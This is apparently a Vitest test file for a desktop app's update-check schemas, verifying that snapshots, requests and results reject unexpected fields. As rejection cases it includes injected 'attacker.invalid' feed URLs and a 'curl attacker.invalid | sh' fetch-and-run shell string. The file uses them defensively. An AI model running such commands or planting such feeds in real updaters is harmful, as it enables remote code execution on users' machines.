import { describe, expect, it } from "vitest";

import {
  aboutUpdateCheckRequestSchema,
  aboutUpdateResultSchema,
  aboutUpdateSnapshotSchema,
} from "./about.js";

describe("About update contract", () => {
  it("accepts only a strict feed-free version 1 snapshot", () => {
    const snapshot = {
      application: {
        architecture: "x64",
        platform: "win32",
        version: "0.1.0",
      },
      lastCheckAt: "2026-08-22T06:00:00.000Z",
      nextAutomaticCheckAt: "2026-08-23T06:00:00.000Z",
      policy: { channel: "stable", mode: "automatic" },
      schemaVersion: 1,
      state: { kind: "up-to-date" },
    };

    expect(aboutUpdateSnapshotSchema.parse(snapshot)).toEqual(snapshot);
    expect(() =>
      aboutUpdateSnapshotSchema.parse({
        ...snapshot,
        feedUrl: "https://attacker.invalid/update",
      }),
    ).toThrow();
    expect(() =>
      aboutUpdateSnapshotSchema.parse({
        ...snapshot,
        install: { argv: ["--force"], command: "restart" },
      }),
    ).toThrow();
    expect(() =>
      aboutUpdateSnapshotSchema.parse({ ...snapshot, schemaVersion: 2 }),
    ).toThrow();
  });

  it.each([
    { name: "idle", state: { kind: "idle" } },
    {
      name: "automatic check",
      state: { kind: "checking", requestedBy: "automatic" },
    },
    {
      name: "user check",
      state: { kind: "checking", requestedBy: "user" },
    },
    { name: "available", state: { kind: "update-available" } },
    { name: "downloaded", state: { kind: "update-downloaded" } },
    { name: "current", state: { kind: "up-to-date" } },
    {
      name: "error",
      state: {
        error: {
          code: "check_failed",
          message: "The update check could not be completed.",
          retryable: true,
        },
        kind: "error",
      },
    },
  ])("accepts the explicit $name state", ({ state }) => {
    expect(
      aboutUpdateSnapshotSchema.parse({
        application: {
          architecture: "x64",
          platform: "win32",
          version: "0.1.0",
        },
        lastCheckAt: null,
        nextAutomaticCheckAt: null,
        policy: { channel: "stable", mode: "automatic" },
        schemaVersion: 1,
        state,
      }).state,
    ).toEqual(state);
  });

  it.each([
    {
      name: "manual",
      policy: {
        message:
          "Download a newer package from GitHub Releases and install it manually.",
        mode: "manual",
        releasePageUrl:
          "https://github.com/oldwinter/skills-desktop/releases",
      },
      state: { kind: "manual" },
    },
    {
      name: "unavailable",
      policy: {
        message: "Update checks are unavailable for this build.",
        mode: "unavailable",
      },
      state: { kind: "unavailable" },
    },
  ])("accepts the explicit $name platform policy", ({ policy, state }) => {
    expect(
      aboutUpdateSnapshotSchema.parse({
        application: {
          architecture: "x64",
          platform: "linux",
          version: "0.1.0",
        },
        lastCheckAt: null,
        nextAutomaticCheckAt: null,
        policy,
        schemaVersion: 1,
        state,
      }).policy,
    ).toEqual(policy);
  });

  it("admits only the fixed version 1 check intent", () => {
    const request = { type: "update.check", version: 1 };
    expect(aboutUpdateCheckRequestSchema.parse(request)).toEqual(request);
    for (const forbidden of [
      { feedUrl: "https://attacker.invalid", ...request },
      { argv: ["--download"], ...request },
      { payload: { url: "https://attacker.invalid" }, ...request },
      { shellText: "curl attacker.invalid | sh", ...request },
      { type: "update.download", version: 1 },
      { type: "update.install", version: 1 },
      { type: "update.restart", version: 1 },
      { type: "update.check", version: 2 },
    ]) {
      expect(() => aboutUpdateCheckRequestSchema.parse(forbidden)).toThrow();
    }
  });

  it("bounds success and IPC failure results", () => {
    const snapshot = aboutUpdateSnapshotSchema.parse({
      application: {
        architecture: "x64",
        platform: "linux",
        version: "0.1.0",
      },
      lastCheckAt: null,
      nextAutomaticCheckAt: null,
      policy: {
        message:
          "Download a newer package from GitHub Releases and install it manually.",
        mode: "manual",
        releasePageUrl:
          "https://github.com/oldwinter/skills-desktop/releases",
      },
      schemaVersion: 1,
      state: { kind: "manual" },
    });
    expect(
      aboutUpdateResultSchema.parse({ ok: true, value: snapshot }),
    ).toEqual({ ok: true, value: snapshot });
    expect(
      aboutUpdateResultSchema.parse({
        error: {
          code: "unauthorized",
          message: "This window cannot make that request.",
          retryable: false,
        },
        ok: false,
      }),
    ).toMatchObject({ error: { code: "unauthorized" }, ok: false });
    expect(() =>
      aboutUpdateResultSchema.parse({
        error: {
          code: "unauthorized",
          message: "This window cannot make that request.",
          rawError: "SECRET_NETWORK_PATH",
          retryable: false,
        },
        ok: false,
      }),
    ).toThrow();
  });

  it("rejects contradictory platform policy and update state", () => {
    const manual = {
      application: {
        architecture: "x64",
        platform: "linux",
        version: "0.1.0",
      },
      lastCheckAt: null,
      nextAutomaticCheckAt: null,
      policy: {
        message:
          "Download a newer package from GitHub Releases and install it manually.",
        mode: "manual",
        releasePageUrl:
          "https://github.com/oldwinter/skills-desktop/releases",
      },
      schemaVersion: 1,
      state: { kind: "manual" },
    };

    expect(() =>
      aboutUpdateSnapshotSchema.parse({
        ...manual,
        state: { kind: "checking", requestedBy: "user" },
      }),
    ).toThrow();
    expect(() =>
      aboutUpdateSnapshotSchema.parse({
        ...manual,
        nextAutomaticCheckAt: "2026-08-23T06:00:00.000Z",
      }),
    ).toThrow();
    expect(() =>
      aboutUpdateSnapshotSchema.parse({
        ...manual,
        policy: { channel: "stable", mode: "automatic" },
      }),
    ).toThrow();
  });
});
